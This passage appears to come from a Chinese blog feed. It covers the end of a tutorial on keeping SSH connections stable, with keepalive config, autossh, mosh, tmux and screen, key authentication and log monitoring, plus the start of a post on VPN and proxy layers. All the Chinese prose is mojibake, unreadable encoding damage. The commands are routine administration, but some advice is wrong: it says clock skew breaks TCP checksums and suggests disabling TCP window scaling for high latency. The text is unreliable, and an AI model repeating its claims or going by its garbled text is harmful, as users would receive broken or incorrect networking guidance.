<h4 id="è¿æ¥çŠ¶æ€ä¸é…ç½®é—®é¢˜"><a href="#è¿æ¥çŠ¶æ€ä¸é…ç½®é—®é¢˜" class="headerlink" title="è¿æ¥çŠ¶æ€ä¸é…ç½®é—®é¢˜"></a><code>è¿æ¥çŠ¶æ€ä¸é…ç½®é—®é¢˜</code></h4><ul>
<li><strong>å¿ƒè·³åŒ…æœºåˆ¶æœªå¯ç”¨</strong>ï¼šæœªé…ç½®<code>ServerAliveInterval</code>ç­‰å‚æ•°ï¼Œæ— æ³•é€šè¿‡å¿ƒè·³åŒ…ç»´æŒè¿æ¥æ´»è·ƒçŠ¶æ€ï¼Œè¢«ä¸­é—´è®¾å¤‡æ–­å¼€ã€‚  </li>
<li><strong>é…ç½®å‚æ•°ä¸åˆç†</strong>ï¼šå¦‚<code>ClientAliveCountMax</code>è®¾ç½®è¿‡å°ï¼Œå¯¼è‡´è½»å¾®ç½‘ç»œå»¶è¿Ÿå³è§¦å‘æ–­è¿ã€‚</li>
</ul>
<h4 id="å®‰å…¨ç­–ç•¥ä¸å¼‚å¸¸è¡Œä¸º"><a href="#å®‰å…¨ç­–ç•¥ä¸å¼‚å¸¸è¡Œä¸º" class="headerlink" title="å®‰å…¨ç­–ç•¥ä¸å¼‚å¸¸è¡Œä¸º"></a><code>å®‰å…¨ç­–ç•¥ä¸å¼‚å¸¸è¡Œä¸º</code></h4><ul>
<li><strong>è´¦å·é”å®šæˆ–è®¤è¯å¤±è´¥</strong>ï¼šå¤šæ¬¡å¯†ç è¾“å…¥é”™è¯¯è§¦å‘å®‰å…¨ç­–ç•¥ï¼Œè´¦æˆ·è¢«é”å®šæˆ–IPè¢«å°ç¦ã€‚  </li>
<li><strong>ä¼šè¯æ®‹ç•™æˆ–å¼‚å¸¸ç»ˆæ­¢</strong>ï¼šè¿æ¥æ–­å¼€æ—¶æœªæ­£å¸¸é‡Šæ”¾èµ„æºï¼Œæ®‹ç•™è¿›ç¨‹å¯èƒ½å¯¼è‡´åç»­è¿æ¥å†²çªã€‚</li>
</ul>
<h4 id="å…¶ä»–å¶å‘å› ç´ "><a href="#å…¶ä»–å¶å‘å› ç´ " class="headerlink" title="å…¶ä»–å¶å‘å› ç´ "></a><code>å…¶ä»–å¶å‘å› ç´ </code></h4><ul>
<li><strong>è·¨æ—¶åŒºæˆ–æ—¶é’ŸåŒæ­¥é—®é¢˜</strong>ï¼šæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯æ—¶é’Ÿåå·®è¿‡å¤§ï¼Œå¯¼è‡´TCPæ ¡éªŒå¤±è´¥ã€‚  </li>
<li><strong>ç½‘ç»œæ”»å‡»æˆ–å¹²æ‰°</strong>ï¼šDDoSæ”»å‡»ã€ä¸­é—´äººæ”»å‡»ç­‰ç ´åTCPè¿æ¥çš„å®Œæ•´æ€§ã€‚</li>
</ul>
<h3 id="ç»´æŒè¿æ¥ï¼š"><a href="#ç»´æŒè¿æ¥ï¼š" class="headerlink" title="ç»´æŒè¿æ¥ï¼š"></a>ç»´æŒè¿æ¥ï¼š</h3><h4 id="1-ç½‘ç»œç¯å¢ƒä¼˜åŒ–"><a href="#1-ç½‘ç»œç¯å¢ƒä¼˜åŒ–" class="headerlink" title="1.ç½‘ç»œç¯å¢ƒä¼˜åŒ–"></a><code>1.ç½‘ç»œç¯å¢ƒä¼˜åŒ–</code></h4><ol>
<li><p><strong>ç‰©ç†ç½‘ç»œç¨³å®šæ€§</strong>  </p>
<ul>
<li>ä½¿ç”¨æœ‰çº¿ç½‘ç»œæ›¿ä»£Wi-Fiï¼Œæˆ–é€‰æ‹©ä¿¡å·å¼ºçš„5GHzé¢‘æ®µï¼Œå‡å°‘æ³¢åŠ¨ã€‚  </li>
<li>é¿å…å¤šå±‚NATç¯å¢ƒï¼ˆå¦‚å®¶åº­è·¯ç”±å™¨+ä¼ä¸šVPNï¼‰ï¼Œé™ä½è¿æ¥è·³æ•°ã€‚</li>
</ul>
</li>
<li><p><strong>é˜²ç«å¢™ä¸NATé…ç½®</strong>  </p>
<ul>
<li>è°ƒæ•´é˜²ç«å¢™è§„åˆ™ï¼Œå…è®¸SSHæµé‡é€šè¿‡ï¼ˆé€šå¸¸ä¸ºTCP 22ç«¯å£ï¼‰ï¼Œå¹¶å»¶é•¿è¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆå¦‚30åˆ†é’Ÿï¼‰ã€‚  </li>
<li>é…ç½®NATè®¾å¤‡çš„é™æ€ç«¯å£æ˜ å°„ï¼Œç¡®ä¿SSHè¿æ¥çš„ç¨³å®šæ€§ã€‚</li>
</ul>
</li>
</ol>
<h4 id="2-SSHè¿æ¥å‚æ•°è°ƒæ•´"><a href="#2-SSHè¿æ¥å‚æ•°è°ƒæ•´" class="headerlink" title="2.SSHè¿æ¥å‚æ•°è°ƒæ•´"></a><code>2.SSHè¿æ¥å‚æ•°è°ƒæ•´</code></h4><ol>
<li><p><strong>å®¢æˆ·ç«¯é…ç½®ï¼ˆ<code>~/.ssh/config</code>ï¼‰-Linuxç³»ç»Ÿ</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host *</span><br><span class="line">    ServerAliveInterval 30    <span class="comment"># æ¯30ç§’å‘é€å¿ƒè·³åŒ…</span></span><br><span class="line">    ServerAliveCountMax 10    <span class="comment"># è¿ç»­10æ¬¡æ— å“åº”æ‰æ–­å¼€</span></span><br><span class="line">    TCPKeepAlive <span class="built_in">yes</span>          <span class="comment"># å¯ç”¨TCPçº§å¿ƒè·³</span></span><br><span class="line">    ControlMaster auto        <span class="comment"># å¯ç”¨è¿æ¥å¤ç”¨</span></span><br><span class="line">    ControlPath ~/.ssh/socket-%r@%h:%p</span><br><span class="line">    ControlPersist 1h         <span class="comment"># ä¸»è¿æ¥ä¿æŒ1å°æ—¶</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>æœåŠ¡å™¨é…ç½®ï¼ˆ<code>/etc/ssh/sshd_config</code>ï¼‰-Linuxç³»ç»Ÿ</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ClientAliveInterval 60        <span class="comment"># æœåŠ¡å™¨ä¸»åŠ¨æ£€æµ‹å®¢æˆ·ç«¯çš„é—´éš”</span></span><br><span class="line">ClientAliveCountMax 3         <span class="comment"># å…è®¸çš„æ— å“åº”æ¬¡æ•°</span></span><br></pre></td></tr></table></figure>
<p>é…ç½®åé‡å¯SSHæœåŠ¡ï¼š<code>sudo systemctl restart sshd</code>ã€‚</p>
</li>
</ol>
<p>SSH å®¢æˆ·ç«¯å¦‚ä½•å‘ç°å¹¶ä½¿ç”¨é…ç½®æ–‡ä»¶ï¼Ÿ</p>
<ol>
<li><p><strong>è‡ªåŠ¨æŸ¥æ‰¾æœºåˆ¶</strong>ï¼š</p>
<ul>
<li>æ¯æ¬¡æ‰§è¡Œ <code>ssh</code> å‘½ä»¤æ—¶ï¼Œå®¢æˆ·ç«¯ä¼š<strong>æŒ‰å›ºå®šé¡ºåº</strong>æŸ¥æ‰¾é…ç½®æ–‡ä»¶ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.ssh/config â†’ /etc/ssh/ssh_config</span><br></pre></td></tr></table></figure></li>
<li>Windows è·¯å¾„ï¼š<code>%USERPROFILE%\.ssh\config</code> â†’ <code>C:\ProgramData\ssh\ssh_config</code></li>
</ul>
</li>
<li><p><strong>ä¼˜å…ˆçº§è§„åˆ™</strong>ï¼š</p>
<ul>
<li>ç”¨æˆ·çº§é…ç½® (<code>~/.ssh/config</code>) &gt; ç³»ç»Ÿçº§é…ç½® (<code>/etc/ssh/ssh_config</code>)</li>
<li>æ–‡ä»¶ä¸­çš„é…ç½®ä»ä¸Šåˆ°ä¸‹ç”Ÿæ•ˆï¼Œ<strong>åå‡ºç°çš„é…ç½®è¦†ç›–å‰é¢çš„</strong></li>
</ul>
</li>
<li><p><strong>åŠ è½½éªŒè¯æ–¹æ³•</strong>ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ·»åŠ  -v å‚æ•°æŸ¥çœ‹åŠ è½½è¿‡ç¨‹</span></span><br><span class="line">ssh <span class="literal">-v</span> user@server.com</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºä¸­ä¼šæ˜¾ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">debug1: Reading configuration data /c/Users/21143/.ssh/config</span><br><span class="line">debug1: Applying options for *</span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="ï¼ˆ1ï¼‰ä¸ºä»€ä¹ˆæ‚¨éœ€è¦æ‰‹åŠ¨åˆ›å»ºæ–‡ä»¶ï¼Ÿ"><a href="#ï¼ˆ1ï¼‰ä¸ºä»€ä¹ˆæ‚¨éœ€è¦æ‰‹åŠ¨åˆ›å»ºæ–‡ä»¶ï¼Ÿ" class="headerlink" title="ï¼ˆ1ï¼‰ä¸ºä»€ä¹ˆæ‚¨éœ€è¦æ‰‹åŠ¨åˆ›å»ºæ–‡ä»¶ï¼Ÿ"></a>ï¼ˆ1ï¼‰ä¸ºä»€ä¹ˆæ‚¨éœ€è¦æ‰‹åŠ¨åˆ›å»ºæ–‡ä»¶ï¼Ÿ</h5><ol>
<li><p><strong>é»˜è®¤æ–‡ä»¶ä¸å­˜åœ¨</strong>ï¼š</p>
<ul>
<li>SSH ä¸ä¼šè‡ªåŠ¨åˆ›å»ºç”¨æˆ·çº§é…ç½®æ–‡ä»¶</li>
<li>é¦–æ¬¡ä½¿ç”¨æ—¶éœ€è¦æ‰‹åŠ¨åˆ›å»º</li>
</ul>
</li>
<li><p><strong>ç›®å½•ç»“æ„è¦æ±‚</strong>ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¿…éœ€çš„ç›®å½•ç»“æ„</span></span><br><span class="line">C:\Users\<span class="number">21143</span>\</span><br><span class="line">  â””â”€â”€ .ssh/</span><br><span class="line">      â”œâ”€â”€ config          <span class="comment"># é…ç½®æ–‡ä»¶</span></span><br><span class="line">      â”œâ”€â”€ id_rsa          <span class="comment"># ç§é’¥</span></span><br><span class="line">      â””â”€â”€ known_hosts     <span class="comment"># å·²çŸ¥ä¸»æœºè®°å½•</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>æƒé™è¦æ±‚</strong>ï¼š</p>
<ul>
<li>å¿…é¡»è®¾ç½®ä¸¥æ ¼æƒé™ï¼ˆå¦åˆ™ SSH ä¼šå¿½ç•¥é…ç½®ï¼‰ï¼š</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">icacls <span class="variable">$env:USERPROFILE</span>\.ssh /inheritance:<span class="built_in">r</span></span><br><span class="line">icacls <span class="variable">$env:USERPROFILE</span>\.ssh /grant:<span class="built_in">r</span> <span class="string">&quot;<span class="variable">$env:USERNAME:</span>(F)&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="ï¼ˆ2ï¼‰é…ç½®æ–‡ä»¶å¦‚ä½•å½±å“è¿æ¥ï¼Ÿ"><a href="#ï¼ˆ2ï¼‰é…ç½®æ–‡ä»¶å¦‚ä½•å½±å“è¿æ¥ï¼Ÿ" class="headerlink" title="ï¼ˆ2ï¼‰é…ç½®æ–‡ä»¶å¦‚ä½•å½±å“è¿æ¥ï¼Ÿ"></a>ï¼ˆ2ï¼‰é…ç½®æ–‡ä»¶å¦‚ä½•å½±å“è¿æ¥ï¼Ÿ</h5><p>å½“æ‚¨æ‰§è¡Œ <code>ssh user@host</code> æ—¶ï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯åŠ è½½ <code>~/.ssh/config</code></li>
<li>åŒ¹é… <code>Host</code> é…ç½®å—ï¼ˆæ”¯æŒé€šé…ç¬¦ï¼‰</li>
<li>åº”ç”¨é…ç½®å‚æ•°åˆ°å½“å‰è¿æ¥</li>
<li>å‘½ä»¤è¡Œå‚æ•°ä¼šè¦†ç›–é…ç½®æ–‡ä»¶è®¾ç½®</li>
</ol>
<h5 id="ï¼ˆ3ï¼‰é…ç½®ç¤ºä¾‹è§£æ"><a href="#ï¼ˆ3ï¼‰é…ç½®ç¤ºä¾‹è§£æ" class="headerlink" title="ï¼ˆ3ï¼‰é…ç½®ç¤ºä¾‹è§£æ"></a>ï¼ˆ3ï¼‰é…ç½®ç¤ºä¾‹è§£æ</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host myserver            <span class="comment"># å®šä¹‰ä¸»æœºåˆ«å</span></span><br><span class="line">  HostName 192.168.1.10  <span class="comment"># çœŸå®IP/åŸŸå</span></span><br><span class="line">  User admin             <span class="comment"># è‡ªåŠ¨ä½¿ç”¨æ­¤ç”¨æˆ·å</span></span><br><span class="line">  Port 2222              <span class="comment"># éæ ‡å‡†ç«¯å£</span></span><br><span class="line">  IdentityFile ~/.ssh/id_ecdsa  <span class="comment"># æŒ‡å®šç§é’¥</span></span><br><span class="line"></span><br><span class="line">Host *                   <span class="comment"># å…¨å±€é»˜è®¤é…ç½®</span></span><br><span class="line">  ServerAliveInterval 30</span><br><span class="line">  TCPKeepAlive <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨æ—¶ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è§¦å‘ myserver é…ç½®å—</span></span><br><span class="line">ssh myserver</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§¦å‘å…¨å±€é…ç½® (*)</span></span><br><span class="line">ssh any<span class="literal">-other-server</span></span><br></pre></td></tr></table></figure>

<h5 id="ï¼ˆ4ï¼‰å…³é”®éªŒè¯æ­¥éª¤"><a href="#ï¼ˆ4ï¼‰å…³é”®éªŒè¯æ­¥éª¤" class="headerlink" title="ï¼ˆ4ï¼‰å…³é”®éªŒè¯æ­¥éª¤"></a>ï¼ˆ4ï¼‰å…³é”®éªŒè¯æ­¥éª¤</h5><ol>
<li><p>åˆ›å»ºæ–‡ä»¶åæ‰§è¡Œï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ£€æŸ¥é…ç½®æ˜¯å¦è¢«åŠ è½½</span></span><br><span class="line">ssh <span class="literal">-G</span> myserver | findstr <span class="string">&quot;ServerAliveInterval&quot;</span></span><br></pre></td></tr></table></figure>
<p>åº”è¾“å‡ºï¼š<code>serveraliveinterval 30</code></p>
</li>
<li><p>æµ‹è¯•è¿æ¥ç¨³å®šæ€§ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è§‚å¯Ÿæ˜¯å¦è¿˜ä¼šè¶…æ—¶æ–­å¼€</span></span><br><span class="line">ssh <span class="literal">-v</span> myserver</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>åªè¦æ–‡ä»¶è·¯å¾„æ­£ç¡®ã€æƒé™åˆè§„ä¸”è¯­æ³•æ— è¯¯ï¼ŒSSH å®¢æˆ·ç«¯ <strong>100% ä¼šè‡ªåŠ¨åŠ è½½</strong> æ­¤é…ç½®æ–‡ä»¶ï¼Œæ— éœ€é¢å¤–æ“ä½œã€‚è¿™æ˜¯ OpenSSH çš„æ ‡å‡†è¡Œä¸ºï¼Œåœ¨ Windows&#x2F;Linux&#x2F;macOS ä¸Šå®Œå…¨ä¸€è‡´ã€‚</p>
</blockquote>
<h4 id="3-æ–­çº¿é‡è¿å·¥å…·"><a href="#3-æ–­çº¿é‡è¿å·¥å…·" class="headerlink" title="3.æ–­çº¿é‡è¿å·¥å…·"></a><code>3.æ–­çº¿é‡è¿å·¥å…·</code></h4><ol>
<li><p><strong>ä½¿ç”¨<code>autossh</code>è‡ªåŠ¨é‡è¿</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">autossh -M 0 -N -D 1080 user@server  <span class="comment"># -M 0ç¦ç”¨ç«¯å£ç›‘æ§ï¼Œä¸“æ³¨é‡è¿</span></span><br></pre></td></tr></table></figure>
<p>å®‰è£…ï¼š  </p>
<ul>
<li>Ubuntu&#x2F;Debianï¼š<code>sudo apt install autossh</code>  </li>
<li>macOSï¼š<code>brew install autossh</code></li>
</ul>
</li>
<li><p><strong>æ›¿ä»£æ–¹æ¡ˆï¼š<code>mosh</code>ï¼ˆç§»åŠ¨SSHï¼‰</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æœåŠ¡å™¨ç«¯å®‰è£…</span></span><br><span class="line"><span class="built_in">sudo</span> apt install mosh  </span><br><span class="line"><span class="comment"># å®¢æˆ·ç«¯è¿æ¥ï¼ˆæ”¯æŒæ–­çº¿è‡ªåŠ¨æ¢å¤ï¼‰</span></span><br><span class="line">mosh user@server</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="4-ä¼šè¯æŒä¹…åŒ–å·¥å…·"><a href="#4-ä¼šè¯æŒä¹…åŒ–å·¥å…·" class="headerlink" title="4.ä¼šè¯æŒä¹…åŒ–å·¥å…·"></a><code>4.ä¼šè¯æŒä¹…åŒ–å·¥å…·</code></h4><ol>
<li><p><strong>ä½¿ç”¨<code>screen</code>æˆ–<code>tmux</code></strong>  </p>
<ul>
<li>åœ¨SSHä¼šè¯ä¸­å…ˆå¯åŠ¨<code>screen</code>æˆ–<code>tmux</code>ï¼Œå†æ‰§è¡Œé•¿æ—¶é—´ä»»åŠ¡ï¼š  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -S mysession    <span class="comment"># åˆ›å»ºä¼šè¯</span></span><br><span class="line"><span class="comment"># æ‰§è¡Œä»»åŠ¡ï¼ˆå¦‚ç¼–è¯‘ã€ä¼ è¾“å¤§æ–‡ä»¶ï¼‰</span></span><br></pre></td></tr></table></figure></li>
<li>æ–­çº¿åé‡æ–°è¿æ¥ï¼Œæ¢å¤ä¼šè¯ï¼š  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -r mysession    <span class="comment"># æ¢å¤ä¼šè¯</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>åå°è¿è¡Œå‘½ä»¤</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> <span class="built_in">command</span> &amp;         <span class="comment"># ä½¿å‘½ä»¤ä¸éšSSHæ–­å¼€è€Œç»ˆæ­¢</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="5-å®‰å…¨ç­–ç•¥ä¼˜åŒ–"><a href="#5-å®‰å…¨ç­–ç•¥ä¼˜åŒ–" class="headerlink" title="5.å®‰å…¨ç­–ç•¥ä¼˜åŒ–"></a><code>5.å®‰å…¨ç­–ç•¥ä¼˜åŒ–</code></h4><ol>
<li><p><strong>å¯†é’¥è®¤è¯æ›¿ä»£å¯†ç </strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen              <span class="comment"># ç”Ÿæˆå¯†é’¥å¯¹</span></span><br><span class="line">ssh-copy-id user@server <span class="comment"># ä¸Šä¼ å…¬é’¥åˆ°æœåŠ¡å™¨</span></span><br></pre></td></tr></table></figure>
<p>ç¦ç”¨å¯†ç è®¤è¯ï¼ˆ<code>/etc/ssh/sshd_config</code>ï¼‰ï¼š  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>è°ƒæ•´ç™»å½•é™åˆ¶</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¢åŠ æœ€å¤§è¿æ¥å°è¯•æ¬¡æ•°</span></span><br><span class="line">MaxAuthTries 6</span><br><span class="line"><span class="comment"># è®¾ç½®ç™»å½•è¶…æ—¶</span></span><br><span class="line">LoginGraceTime 30s</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="6-ç›‘æ§ä¸å‘Šè­¦"><a href="#6-ç›‘æ§ä¸å‘Šè­¦" class="headerlink" title="6.ç›‘æ§ä¸å‘Šè­¦"></a><code>6.ç›‘æ§ä¸å‘Šè­¦</code></h4><ol>
<li><p><strong>å®æ—¶ç›‘æ§è¿æ¥çŠ¶æ€</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch -n 1 <span class="string">&#x27;ss -tunap | grep ssh&#x27;</span>  <span class="comment"># å®æ—¶æŸ¥çœ‹SSHè¿æ¥</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>æ—¥å¿—åˆ†æå·¥å…·</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">journalctl -u sshd -f  <span class="comment"># å®æ—¶æŸ¥çœ‹SSHæœåŠ¡æ—¥å¿—</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>å‘Šè­¦æœºåˆ¶</strong>  </p>
<ul>
<li>é…ç½®æœåŠ¡å™¨ç›‘æ§å·¥å…·ï¼ˆå¦‚Prometheus+Grafanaï¼‰ï¼Œå½“SSHè¿æ¥å¼‚å¸¸æ—¶å‘é€é€šçŸ¥ã€‚</li>
</ul>
</li>
</ol>
<h4 id="7-ç‰¹æ®Šåœºæ™¯è§£å†³æ–¹æ¡ˆ"><a href="#7-ç‰¹æ®Šåœºæ™¯è§£å†³æ–¹æ¡ˆ" class="headerlink" title="7.ç‰¹æ®Šåœºæ™¯è§£å†³æ–¹æ¡ˆ"></a><code>7.ç‰¹æ®Šåœºæ™¯è§£å†³æ–¹æ¡ˆ</code></h4><ol>
<li><p><strong>é«˜å»¶è¿Ÿç½‘ç»œ</strong>  </p>
<ul>
<li>é™ä½TCPçª—å£ç¼©æ”¾ï¼š  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®¢æˆ·ç«¯ä¸´æ—¶è®¾ç½®</span></span><br><span class="line"><span class="built_in">sudo</span> sysctl -w net.ipv4.tcp_window_scaling=0</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>è·¨æ—¶åŒºæ—¶é’ŸåŒæ­¥</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install ntp    <span class="comment"># å®‰è£…NTPæœåŠ¡</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart ntp</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="8-æµ‹è¯•ä¸éªŒè¯"><a href="#8-æµ‹è¯•ä¸éªŒè¯" class="headerlink" title="8.æµ‹è¯•ä¸éªŒè¯"></a><code>8.æµ‹è¯•ä¸éªŒè¯</code></h4><ol>
<li><p><strong>ç½‘ç»œè¿é€šæ€§æµ‹è¯•</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping server             <span class="comment"># æµ‹è¯•ç½‘ç»œå¯è¾¾æ€§</span></span><br><span class="line">traceroute server       <span class="comment"># è¿½è¸ªè·¯ç”±è·¯å¾„</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>ç«¯å£å¯ç”¨æ€§æµ‹è¯•</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -zv server 22        <span class="comment"># æµ‹è¯•SSHç«¯å£è¿é€šæ€§</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>åŸºç¡€çŸ¥è¯†</category>
      </categories>
      <tags>
        <tag>SSH</tag>
        <tag>éš§é“æŠ€æœ¯</tag>
        <tag>æœåŠ¡å™¨</tag>
      </tags>
  </entry>
  <entry>
    <title>VPNä»£ç†ä¸æµé‡æµå‘åˆ†æ</title>
    <url>/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="ä¸€ã€ä»£ç†å±‚çº§æ¶æ„ä¸ä¼˜å…ˆçº§åŸç†"><a href="#ä¸€ã€ä»£ç†å±‚çº§æ¶æ„ä¸ä¼˜å…ˆçº§åŸç†" class="headerlink" title="ä¸€ã€ä»£ç†å±‚çº§æ¶æ„ä¸ä¼˜å…ˆçº§åŸç†"></a>ä¸€ã€ä»£ç†å±‚çº§æ¶æ„ä¸ä¼˜å…ˆçº§åŸç†</h2><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_1.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">




<h3 id="1-ç½‘ç»œå±‚ä»£ç†ï¼ˆVPNï¼‰-æœ€åº•å±‚"><a href="#1-ç½‘ç»œå±‚ä»£ç†ï¼ˆVPNï¼‰-æœ€åº•å±‚" class="headerlink" title="1. ç½‘ç»œå±‚ä»£ç†ï¼ˆVPNï¼‰- æœ€åº•å±‚"></a>1.<code> ç½‘ç»œå±‚ä»£ç†</code>ï¼ˆVPNï¼‰- æœ€åº•å±‚</h3><ul>
<li><strong>å·¥ä½œå±‚çº§</strong>ï¼šæ“ä½œç³»ç»Ÿå†…æ ¸å±‚</li>
<li><strong>æŠ€æœ¯ä»£è¡¨</strong>ï¼šOpenVPNã€WireGuardã€IPsec</li>
<li><strong>æ§åˆ¶ç²’åº¦</strong>ï¼š<strong>å…¨å±€ä»£ç†</strong> - æ‰€æœ‰åº”ç”¨ç¨‹åºæµé‡</li>
<li><strong>æŠ€æœ¯æ¯”å–»</strong>ï¼šç»™ç”µè„‘<strong>è™šæ‹Ÿæ¬è¿</strong>åˆ°VPNæœåŠ¡å™¨æœºæˆ¿</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šé€æ˜æ€§é«˜ã€å®‰å…¨æ€§å¼ºï¼Œä½†çµæ´»æ€§å·®</li>
</ul>
<h3 id="2-ç³»ç»Ÿå±‚ä»£ç†-ä¸­é—´å±‚"><a href="#2-ç³»ç»Ÿå±‚ä»£ç†-ä¸­é—´å±‚" class="headerlink" title="2. ç³»ç»Ÿå±‚ä»£ç† - ä¸­é—´å±‚"></a>2. <code>ç³»ç»Ÿå±‚ä»£ç† </code>- ä¸­é—´å±‚</h3><ul>
<li><strong>å·¥ä½œå±‚çº§</strong>ï¼šæ“ä½œç³»ç»Ÿåº”ç”¨å±‚åè®®</li>
<li><strong>æŠ€æœ¯ä»£è¡¨</strong>ï¼šWindows&#x2F;MacOSç³»ç»Ÿä»£ç†è®¾ç½®</li>
<li><strong>æ§åˆ¶ç²’åº¦</strong>ï¼š<strong>ç³»ç»Ÿçº§</strong> - å½±å“éµå®ˆç³»ç»Ÿè®¾ç½®çš„åº”ç”¨ç¨‹åº</li>
<li><strong>æŠ€æœ¯æ¯”å–»</strong>ï¼šè®¾ç«‹<strong>æ€»çš„æ”¶å‘å®¤</strong>å¤„ç†å¤–å¯„ä¿¡ä»¶</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šé…ç½®æ–¹ä¾¿ï¼Œä½†å®¹æ˜“è¢«åº”ç”¨ç¨‹åºç»•è¿‡</li>
</ul>
<h3 id="3-åº”ç”¨å±‚ä»£ç†-æœ€é«˜å±‚"><a href="#3-åº”ç”¨å±‚ä»£ç†-æœ€é«˜å±‚" class="headerlink" title="3. åº”ç”¨å±‚ä»£ç† - æœ€é«˜å±‚"></a>3. <code>åº”ç”¨å±‚ä»£ç†</code> - æœ€é«˜å±‚</h3><ul>
<li><p><strong>æµè§ˆå™¨æ’ä»¶</strong>ï¼ˆSwitchyOmegaç­‰ï¼‰ï¼š</p>
<ul>
<li><strong>æ§åˆ¶ç²’åº¦</strong>ï¼š<strong>è¿›ç¨‹çº§</strong> - ä»…æ§åˆ¶æµè§ˆå™¨æµé‡</li>
<li><strong>æŠ€æœ¯æ¯”å–»</strong>ï¼šä¹¦æˆ¿å†…çš„<strong>æ™ºèƒ½è·¯ç”±å™¨</strong></li>
<li><strong>å­˜åœ¨æ„ä¹‰</strong>ï¼šæä¾›æœ€ç²¾ç»†çš„æµé‡æ§åˆ¶ï¼Œå®ç°å›½å†…å¤–ç½‘ç«™åˆ†æµ</li>
</ul>
</li>
<li><p><strong>åº”ç”¨ç¨‹åºå†…ç½®ä»£ç†</strong>ï¼š</p>
<ul>
<li><strong>æ§åˆ¶ç²’åº¦</strong>ï¼š<strong>åº”ç”¨çº§</strong> - ä»…å½±å“å•ä¸ªåº”ç”¨ç¨‹åº</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šé…ç½®ç‹¬ç«‹ï¼Œé’ˆå¯¹æ€§å¼ºçš„ç½‘ç»œé€šé“</li>
</ul>
</li>
</ul>
<hr>
